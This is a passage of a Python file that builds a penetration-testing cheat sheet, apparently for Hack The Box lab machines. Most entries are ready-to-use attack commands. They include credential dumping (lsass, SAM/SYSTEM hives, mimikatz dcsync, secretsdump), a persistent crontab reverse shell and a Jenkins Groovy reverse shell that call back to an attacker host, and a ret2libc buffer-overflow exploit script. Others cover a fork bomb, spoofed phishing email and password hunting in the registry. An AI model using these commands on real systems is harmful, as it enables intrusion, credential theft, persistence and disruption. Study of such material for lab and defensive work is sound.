echo; rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200" | awk '{{print $1}}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser $rid" | grep "User Name" | awk 'NF{{print$NF}}')"; done

# If a user has the capability to change another user's passwordChange without knowing that user's current password, then:
rpcclient -U "support%!00^BlackKnight" 10.10.10.192
	{Color.GRAY}rpcclient $>{Color.RESET}  # setuserinfo2 username level new_password
	{Color.GRAY}rpcclient $>{Color.RESET} setuserinfo2 audit2020 24 J4v4li123$!
"""

######################################
######################################

lsass = Cheat("pypykatz - lsass.DMP - Memory Dump")
lsass.category = "Windows"
lsass.subCategory = "RPC"
lsass.output = """[*] Pure Python implementation of Mimikatz - (lsa) Get secrets from memory dump

pypykatz lsa minidump lsass.DMP
"""

######################################
######################################

samAndSystem = Cheat("SAM and SYSTEM - Dump hash and system information")
samAndSystem.category = "Windows"
samAndSystem.subCategory = "PrivEsc"
samAndSystem.output = """[*] SAM and SYSTEM - Dump hash and system information

# Get a copy files in use in RAM memory
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup

# Donwload files in kali
copy system.backup \\10.10.14.16\smbFolder\system.backup
copy sam.backup \\10.10.14.16\smbFolder\sam.backup

# Extract data
secretsdump.py -sam sam.backup -system system.backup LOCAL
"""

######################################
######################################

rdate = Cheat("rdate - Clock skew too great - syncronize time")
rdate.category = "Tools"
rdate.subCategory = "Utility"
rdate.output = """[*] rdate - set the system's date from a remote hos

rdate -n 10.10.10.175
"""

######################################
######################################

mimikatz = Cheat("mimikatz.exe - GetChanges && GetChangesAll in AD/DC")
mimikatz.category = "Windows"
mimikatz.subCategory = "PrivEsc via group"
mimikatz.output = """[*] Dump Hash of all users of a AD or a DC, when we have GetChanges && GetChangesAll up

wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe

# When mimikatz go in infinite loop...
.\mimikatz.exe 'lsadump::dcsync /domain:testlab.local /user:Administrator' exit

[*] Better way to get all Hash with impacket-secretsdump
secretsdump.py egotistical-bank.local/fsmith@10.10.10.175
"""

######################################
######################################

goBuild = Cheat("go build flags - upx - minimize executable files")
goBuild.category = "Tools"
goBuild.subCategory = "Utility"
goBuild.output = """[*] Build an executable in go with flags to get a small binary

go build -ldflags '-s -w' .
upx executableFile
"""

######################################
######################################

kerbrute = Cheat(
    "kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
)
kerbrute.category = "Windows"
kerbrute.subCategory = "Kerberos"
kerbrute.output = """[*] KERBRUTE - A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

# Repository: https://github.com/ropnop/kerbrute
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags '-s -w' .
upx kerbrute

kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local -t 50 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

[*] Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users.txt
"""

######################################
######################################

defaultCredentials = Cheat("Search for passwords in Windows/AD/DC")
defaultCredentials.category = "Windows"
defaultCredentials.subCategory = "Password"
defaultCredentials.output = """[*] Search for “Password”

#Search suspicious files from filename
dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\\\windows"

#Search suspicious files from content
findstr /D:C:\ /si password *.xml *.ini *.txt #A lot of output can be generated
findstr /D:C:\ /M /SI password *.xml *.ini *.txt 2>nul | findstr /V /I "\\\\AppData\\\\Local \\\\WinXsX ApnDatabase.xml \\\\UEV\\\\InboxTemplates \\\\Microsoft.Windows.CloudExperienceHost" 2>nul


[*] Search Password in Registry

# Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul  

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"

# Check the values saved in each session, user/password could be there
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s  
reg query "HKCU\Software\OpenSSH\Agent\Key"

# Search for passwords inside all the registry
reg query HKLM /f password /t REG_SZ /s #Look for registries in HKLM that contains "password"
reg query HKCU /f password /t REG_SZ /s #Look for registries in HKCU that contains "password"

[*] With winPEAS.exe
.\winPEAS.exe quiet filesinfo userinfo
"""

######################################
######################################

ldapsearch = Cheat("ldapsearch - LDAP search tool")
ldapsearch.category = "Windows"
ldapsearch.subCategory = "RPC"
ldapsearch.output = """[*] ldapsearch is a shell-accessible interface to the ldap_search_ext(3) library cal

# sudo apt install ldap-utils
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local"
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25 | grep -Ei "userPrincipalName|pass|pwd"
"""

######################################
######################################

xxd = Cheat("xxd - Hexadecimal Editor - MIME")
xxd.category = "Tools"
xxd.subCategory = "Utility"
xxd.output = """[*] xxd - Hexadecimal Editor

# encode as Hexadecimal
echo "Test" | xxd -ps

# decode from Hexadecimal
echo "546573740a" | xxd -ps -r

[*] Change MIME Type of file...
# https://en.wikipedia.org/wiki/List_of_file_signatures
# This methode will overwrite first bytes...

xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
"""

######################################
######################################

vncdecrypt = Cheat("VNC decrypt - oneliner")
vncdecrypt.category = "Tools"
vncdecrypt.subCategory = "VNC"
vncdecrypt.output = """[*] Decrypt passwords stored in VNC files

echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
"""

######################################
######################################

socat = Cheat("socat - PortForwarding - localhost to remote host ipv6")
socat.category = "Tools"
socat.subCategory = "Forwarding"
socat.output = """[*] Socat - Multipurpose relay (SOcket CAT)
[*] Socat  is  a command line based utility that establishes two bidirectional byte streams and transfers data between them

socat TCP-LISTEN:445,fork TCP:dead:beef::b885:d62a:d679:573f:445
"""

######################################
######################################

mp_cmd_exe = Cheat("MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML")
mp_cmd_exe.category = "Windows"
mp_cmd_exe.subCategory = "PrivEsc"
mp_cmd_exe.output = """[*] MpCmdRun.exe - dedicated command-line tool of Microsoft Defender Antivirus

# Prepare responder.py for catch NTML HASH
sudo responder.py -I tun0 -v
sudo responder.py -I tun0 --lm -v # for force get NTLMv1

# Scan remote file
.\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.21\\test.txt
"""

######################################
######################################

secredump = Cheat("secretsdump.py - ntds - ntlm - system - sam")
secredump.category = "Tools"
secredump.subCategory = "RPC"
secredump.output = """[*] Get all hashes os all domain users

secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
"""

######################################
######################################

forkBomb = Cheat("Fork Bomb")
forkBomb.category = "Linux"
forkBomb.subCategory = "Utility"
forkBomb.output = """[*] Fork Bomb - Creates processes until system "crashes"

:(){:|:&};:
"""

######################################
######################################

linuxPersistenceReverseShell = Cheat("Reverse Shell - Persistent Reverse Collectors")
linuxPersistenceReverseShell.category = "Linux"
linuxPersistenceReverseShell.subCategory = "Reverse Shell"
linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor via crontab

(touch /dev/shm/.tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/443 0>&1'" >> /dev/shm/.tab ; crontab /dev/shm/.tab ; rm /dev/shm/.tab) > /dev/null 2>&1
"""

######################################
######################################

connectDatabaseViaPHP = Cheat("php --interactive - connect to database via php - PDO connection")
connectDatabaseViaPHP.category = "Tools"
connectDatabaseViaPHP.subCategory = "Databases"
connectDatabaseViaPHP.output = """[*] php --interactive - connect to database via php when we have no mysql or similar in target machine

php --interactive

php > $connection = new PDO('mysql:host=localhost;dbname=databasename', 'username', 'password');  # OR
php > $connection = new PDO('mssql:host=localhost;dbname=databasename', 'username', 'password');  # OR
php > $connection = new PDO('pgsql:host=localhost;dbname=databasename', 'username', 'password');  # ...

php > $connect = $connection->query("SELECT * FROM profiles");
php > $result = $connect->fetchAll();
php > print_r($results);
"""

######################################
######################################

sshPassInCMD = Cheat("sshpass - write password in command line on login with sshpass")
sshPassInCMD.category = "Tools"
sshPassInCMD.subCategory = "Password"
sshPassInCMD.output = """[*] sshpass - write password in command line on login with sshpass

sshpass -p 'Passw0rd!' ssh clave@10.10.10.114
"""

######################################
######################################

winrmEnable = Cheat("Enable WinRM - Powershell")
winrmEnable.category = "Windows"
winrmEnable.subCategory = "WinRM"
winrmEnable.output = """[*] Quick default configuration of WinRM

winrm quickconfig

[*] Fix WinRM firewall exception

Get-NetConnectionProfile
Set-NetConnectionProfile -InterfaceIndex 6 -NetworkCategory Private

winrm quickconfig
"""

######################################
######################################

sendImpersonatedEmail = Cheat("email - send impersonated email with python")
sendImpersonatedEmail.category = "Python"
sendImpersonatedEmail.subCategory = "Email"
sendImpersonatedEmail.output = """[*] Send an impersonated email via email

sudo apt install sendmail


#########################################
import smtplib
import os, time

os.system("/etc/init.d/sendmail start")
time.sleep(4)

HOST = "localhost"
SUBJECT = "Testing python email"
TO = "syjulio123@gmail.com"
FROM = "testingPostMail@hotmail.com"
TEXT = "This is a test email"
BODY = "\n".join((
	f"From: {FROM}",
	f"To: {TO}",
	f"Subject: {SUBJECT}",
	"",
	TEXT, 
	"\r\n"))

server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server.quit()

time.sleep(4)
os.system("/etc/init.d/sendmail stop")
"""

######################################
######################################

jaula = Cheat("Sair da Jaula! Upgrade e estabilizar o shell")
jaula.category = "Linux"
jaula.subCategory = "Reverse Shell"
jaula.output = """[*] Sair da Jaula! Upgrade e estabilizar o shell

python3 -c 'import pty;pty.spawn("/bin/bash")'  # OR
/usr/bin/script -qc /bin/bash /dev/null         # OR
script /dev/null -c bash
export TERM=xterm
export SHELL=bash

# Ctrl + Z
stty raw -echo; fg; reset
stty rows 40 columns 170
"""

######################################
######################################

ret2libc = Cheat("ret2libc attack - BOF - Binary exploit - Linux")
ret2libc.category = "Linux"
ret2libc.subCategory = "Reverse Engineering"
ret2libc.output = """[*] ret2libc (return to libc, or return to the C library) attack

# Get offset with gdb
gdb ./binary.elf

gef> run $(python -c 'print("A"*100)')
get> pattern create 100
	[+] Generating a pattern of 100 bytes (n=4)
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
	[+] Saved as '$_gef0'
gef> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gef> pattern offset $eip
	[+] Searching for '$eip'
	[+] Found at offset 52 (little-endian search) likely
	[+] Found at offset 49 (big-endian search)

# check if we really control the EIP address
gef> run $(python -c 'print("A" * 52 + "BBBB")')


# Python Script
from struct import pack
import os, sys


def getLibcAddr():
	return int(os.popen("ldd /home/ayush/.binary/rop | grep libc | awk 'NF{print$NF}' | tr -d '()'").read().strip(), 16)

def getSystemAddrOff():
	return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@@' | awk '{print$2}'").read().strip(), 16)

def getExitAddrOff():
	return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@@' | awk '{print$2}'").read().strip(), 16)

def getBinShAddrOff():
	return int(os.popen("strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh' | awk '{print$1}'").read().strip(), 16)

def mostFrequent(List):
	detailed_dict = {}
	count = 0
	mostFrequentItem = ''
	for item in List:
		detailed_dict[item] = detailed_dict.get(item, 0) + 1
		if detailed_dict[item] >= count:
			count = detailed_dict[item]
			mostFrequentItem = item
	return(mostFrequentItem)

def p32(num):
	return pack("<I",num)


baseLibc = mostFrequent([getLibcAddr() for i in range(1000)])

systemAddr = baseLibc + getSystemAddrOff()
exitAddr = baseLibc + getExitAddrOff()
binShAddr = baseLibc + getBinShAddrOff()

offset = 52
junk = b"A" * offset

payload = junk
payload += p32(systemAddr)
payload += p32(exitAddr)
payload += p32(binShAddr) 

while True:
	res = os.system(b"/home/ayush/.binary/rop " + payload)
	if res == 0:
		sys.exit(0)
"""

######################################
######################################

pythonProxyBurp = Cheat("Python - Request via Burpsuite")
pythonProxyBurp.category = "Python"
pythonProxyBurp.subCategory = "Requests"
pythonProxyBurp.output = """[*] Python - Request via Burpsuite

import requests


proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.get("https://www.google.com/", proxies=proxies, verify=False)
"""

######################################
######################################

updateWPPlugins = Cheat("Update wordlist of wp-plugins (WordPress)")
updateWPPlugins.category = "Web"
updateWPPlugins.subCategory = "CMS"
updateWPPlugins.output = """[*] Update wordlist of wp-plugins for discover plugins with ffuf

# The default location of plugins in wordpress is http://site.com/wp-content/plugins/<pluginName>

for i in $(seq 1 1757); do curl https://github.com/orgs/wp-plugins/repositories?page=$i | grep "name codeRepository" | grep -oP 'href=".*?"' | sed 's/href="//g' | tr -d '"'; done >> wp-plugins_by_javali.txt

# Change wp-plugins/ by wp-content/plugins/
"""

######################################
######################################

rsaDecrypt = Cheat("RSA Decrypt")
rsaDecrypt.category = "Tools"
rsaDecrypt.subCategory = "Password"
rsaDecrypt.output = """[*] Decrypt RSA keys

# GOOGLE: RSA step by step decrypt - cryptool portal

"""

######################################
######################################

openPortsForDontAskSudoAllTime = Cheat("Unrestrict ports for use all ports under 1000 without sudo privilege")
openPortsForDontAskSudoAllTime.category = "Kali"
openPortsForDontAskSudoAllTime.subCategory = "Configurations"
openPortsForDontAskSudoAllTime.output = """[*] remove all privileged ports on linux

#save configuration permanently
echo 'net.ipv4.ip_unprivileged_port_start=0' > /etc/sysctl.d/50-unprivileged-ports.conf
#apply conf
sysctl --system
"""
sendImpersonatedEmailViaCli = Cheat("email - send impersonated email with swaks (CLI)")
sendImpersonatedEmailViaCli.category = "Tools"
sendImpersonatedEmailViaCli.subCategory = "Email"
sendImpersonatedEmailViaCli.output = """[*] Send an impersonated email via swaks (CLI)

# Installation
sudo apt install swaks

# Send an email to multiples email addresses
swaks --from "javali@sneakycorp.htb" --to "airisatou@sneakymailer.htb,angelicaramos@sneakymailer.htb,ashtoncox@sneakymailer.htb," --header "Subject: Exclusivo, fotos da tua avó na praia xD" --body "Oh meus deus\!, uma loucura... -> http://10.10.14.9/avo.jpg" --server 10.10.10.197
"""


######################################
######################################

logPoisonning = Cheat("Log Poisoning")
logPoisonning.category = "Web"
logPoisonning.subCategory = "RCE"
logPoisonning.output = """[*] Transforme a LFI into a RCE

# https://www.thehacker.recipes/web/inputs/file-inclusion

# Potencial files for Log Poisoning - LINUX
/var/log/auth.log
/var/log/vsftpd.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/var/log/apache/error.log
/var/log/mail.log

/var/lib/php5/sess_[PHPSESSID]
/var/lib/php/sessions/sess_[PHPSESSID]
"""

######################################
######################################

WordpressTrics = Cheat("Wordpress - Importante Files")
WordpressTrics.category = "Web"
WordpressTrics.subCategory = "CMS"
WordpressTrics.output = """[*] Wordpress - Importante Files

# Logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log

# VirtualHost
/etc/apache2/sites-available/000-default.conf
"""

######################################
######################################

jenkinsRCE = Cheat("JenkinsRCE with Script Groovy")
jenkinsRCE.category = "Web"
jenkinsRCE.subCategory = "RCE"
jenkinsRCE.output = """[*] Execute command remotely with Script Groovy via Jenkins


# or String cmd="/bin/bash";

String host="10.10.10.120";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
"""
